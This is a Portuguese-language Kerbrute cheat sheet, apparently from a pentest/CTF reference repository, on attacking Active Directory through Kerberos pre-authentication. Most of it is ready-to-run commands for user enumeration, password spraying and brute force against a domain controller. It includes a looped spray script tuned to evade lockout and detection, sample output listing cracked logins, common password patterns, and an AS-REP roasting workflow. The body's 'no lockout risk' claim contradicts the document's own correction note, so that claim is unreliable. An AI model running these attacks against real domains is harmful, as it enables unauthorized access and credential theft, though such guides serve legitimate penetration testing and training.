# 🔑 Kerbrute — enumeração de utilizadores através de Kerberos

<!-- language-home-navigation -->
[🏠 Página inicial em português](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

> **Correção de precisão:** a afirmação «sem risco de bloqueio» não se aplica a todos os modos. Userenum sem pré-autenticação distingue contas sem tentar palavras-passe; passwordspray, bruteuser e bruteforce enviam tentativas de autenticação que podem provocar bloqueios e gerar eventos. Um intervalo fixo de cinco minutos não garante segurança face à política do domínio. Algumas opções de saída também dependem da versão. [Documentação original do Kerbrute](https://github.com/ropnop/kerbrute). Password spraying testa uma palavra-passe contra várias contas; força bruta testa várias hipóteses de credenciais.

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗███████╗██████╗ ██████╗ ██████╗ ██╗   ██╗████████╗███████╗
  ██║ ██╔╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
  █████╔╝ █████╗  ██████╔╝██████╔╝██████╔╝██║   ██║   ██║   █████╗  
  ██╔═██╗ ██╔══╝  ██╔══██╗██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
  ██║  ██╗███████╗██║  ██║██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
  ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
           Ferramenta de força bruta de pré-autenticação Kerberos
```

<p align="center">
  <img src="https://img.shields.io/badge/Kerbrute-Kerberos-red?style=for-the-badge" alt="Kerbrute">
  <img src="https://img.shields.io/badge/User_Enumeration-blue?style=for-the-badge" alt="Enum">
  <img src="https://img.shields.io/badge/Password_Spray-green?style=for-the-badge" alt="Spray">
</p>

---

## 📋 Índice

- [O que é o Kerbrute](#-what-is-kerbrute)
- [Instalação](#-installation)
- [Enumeração de utilizadores](#-user-enumeration)
- [Password spraying](#-password-spraying)
- [Força bruta](#-brute-force)
- [Referência rápida](#-quick-reference)

---

<a id="-what-is-kerbrute"></a>
## 🎯 O que é o Kerbrute

O **Kerbrute** utiliza a pré-autenticação Kerberos para enumerar utilizadores e testar palavras-passe em várias contas:

- 🔍 **Enumeração de utilizadores** — Encontrar nomes válidos sem credenciais!
- 🔐 **Password spraying** — Testar uma palavra-passe contra muitos utilizadores
- 💥 **Força bruta** — Testar combinações de credenciais
- 🚫 **Sem risco de bloqueio** — As falhas de pré-autenticação não provocam bloqueios

### Porquê o Kerbrute?

| Método | Provoca bloqueio de conta | Registos gerados |
|--------|------------------|----------------|
| Ligação LDAP (bind) | Sim | Sim |
| Autenticação SMB | Sim | Sim |
| **Pré-autenticação Kerberos** | **Não** | Mínimos |

---

<a id="-installation"></a>
## 🚀 Instalação

### Descarregar o binário

```bash
# Linux
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute

# Windows (PowerShell)
Invoke-WebRequest -Uri "https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_amd64.exe" -OutFile kerbrute.exe
```

### A partir do código-fonte

```bash
go install github.com/ropnop/kerbrute@latest
```

### Verificar

```bash
kerbrute --help
```

---

<a id="-user-enumeration"></a>
## 🔍 Enumeração de utilizadores

### Utilização básica

```bash
# Enumerar utilizadores a partir de uma lista de palavras
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt

# Com o nome do controlador de domínio
kerbrute userenum -d domain.local --dc dc01.domain.local users.txt
```

### Opções de saída

```bash
# Saída detalhada
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -v

# Guardar a saída num ficheiro
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -o valid_users.txt

# Saída JSON
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt --json -o results.json
```

### Utilização de threads

```bash
# Aumentar o número de threads (predefinição: 10)
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 50

# Threads com precauções
kerbrute userenum -d domain.local --dc 10.10.10.10 users.txt -t 20 --delay 100
```

### Exemplo de saída

```
2024/01/15 10:30:00 >  [+] VALID USERNAME:    admin@domain.local
2024/01/15 10:30:01 >  [+] VALID USERNAME:    john@domain.local
2024/01/15 10:30:02 >  [+] VALID USERNAME:    svc_sql@domain.local
```

---

<a id="-password-spraying"></a>
## 🔐 Password spraying

### Password spraying básico

```bash
# Testar uma palavra-passe contra vários utilizadores
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Password123!'

# A partir de ficheiro
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

### Várias palavras-passe

```bash
# Testar várias palavras-passe (uma de cada vez!)
for pass in $(cat passwords.txt); do
    echo "Trying: $pass"
    kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt "$pass"
    sleep 300  # Aguardar 5 minutos entre rondas de testes
done
```

### Saída

```bash
# Guardar as credenciais válidas na saída
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass123!' -o valid_creds.txt
```

### Exemplo de saída

```
2024/01/15 10:35:00 >  [+] VALID LOGIN:    john@domain.local:Password123!
2024/01/15 10:35:01 >  [+] VALID LOGIN:    admin@domain.local:Password123!
```

### Password spraying com precauções

```bash
# Verificar primeiro a política de palavras-passe!
crackmapexec ldap DC01 -u user -p pass --password-policy

# Pouco tráfego e baixa velocidade
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Pass!' -t 5 --delay 500
```

---

<a id="-brute-force"></a>
## 💥 Força bruta

### Força bruta completa

```bash
# Testar todas as combinações utilizador:palavra-passe
kerbrute bruteuser -d domain.local --dc 10.10.10.10 passwords.txt admin
```

### Lista combinada

```bash
# Utilizar o formato username:password
kerbrute bruteforce -d domain.local --dc 10.10.10.10 creds.txt

# Formato de creds.txt:
# admin:Password1
# john:Summer2024
```

---

<a id="-quick-reference"></a>
## 📊 Referência rápida

### Comandos

| Comando | Descrição |
|---------|-------------|
| `userenum` | Enumerar nomes de utilizador válidos |
| `passwordspray` | Testar uma palavra-passe contra vários utilizadores |
| `bruteuser` | Testar palavras-passe por força bruta numa única conta |
| `bruteforce` | Testar combinações utilizador:palavra-passe |

### Opções essenciais

| Opção | Descrição |
|--------|-------------|
| `-d` | Nome do domínio |
| `--dc` | Endereço IP ou nome do controlador de domínio |
| `-t` | Threads (predefinição: 10) |
| `-o` | Ficheiro de saída |
| `-v` | Saída detalhada |
| `--delay` | Intervalo entre tentativas (ms) |

### Enumeração de utilizadores

```bash
# Básico
kerbrute userenum -d DOMAIN --dc DC_IP users.txt

# Com saída guardada
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -o valid.txt

# Rápido
kerbrute userenum -d DOMAIN --dc DC_IP users.txt -t 50
```

### Password spraying

```bash
# Password spraying básico
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Password!'

# Password spraying com precauções
kerbrute passwordspray -d DOMAIN --dc DC_IP users.txt 'Pass!' -t 5 --delay 500
```

### Listas de palavras para enumeração de utilizadores

```bash
# Nomes comuns
/usr/share/seclists/Usernames/Names/names.txt

# Nomes de utilizador mais frequentes
/usr/share/seclists/Usernames/top-usernames-shortlist.txt

# Formato personalizado
echo -e "administrator\nadmin\nuser\njohn\njane" > users.txt
```

### Palavras-passe comuns

```
Season+Year: Summer2024!, Winter2024!, Fall2024!
Company+Num: CompanyName123!, Company2024!
Generic: Password1, Welcome1, P@ssw0rd
```

---

## 🎯 Conselhos para CTF

1. **Comece sempre pela enumeração** — Obtenha nomes de utilizador sem credenciais!
2. **Verifique AS-REP** — Depois de encontrar utilizadores, procure contas sem pré-autenticação
3. **Teste palavras-passe com cuidado** — Teste uma palavra-passe e aguarde
4. **Verifique a política** — Conheça o limiar de bloqueio de contas
5. **Utilize intervalos** — Reduza a probabilidade de deteção

### Fluxo de trabalho

```bash
# 1. Enumerar utilizadores
kerbrute userenum -d domain.local --dc 10.10.10.10 names.txt -o users.txt

# 2. Procurar contas suscetíveis a AS-REP roasting
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass

# 3. Testar uma palavra-passe em várias contas
kerbrute passwordspray -d domain.local --dc 10.10.10.10 users.txt 'Summer2024!'
```

---

## 📚 Recursos

- [Kerbrute GitHub](https://github.com/ropnop/kerbrute)
- [ropnop Blog](https://blog.ropnop.com/)

### Guias de referência relacionados
- [AD Methodology](../../AD-Attack-Methodology/translations/README.pt.md)
- [Rubeus](../../Rubeus/translations/README.pt.md)
- [CrackMapExec](../../CrackMapExec/translations/README.pt.md)

---

<p align="center">
  <b>🔑 Enumere utilizadores e teste palavras-passe!</b><br>
  <i>Kerbrute — acesso com menor visibilidade</i>
</p>
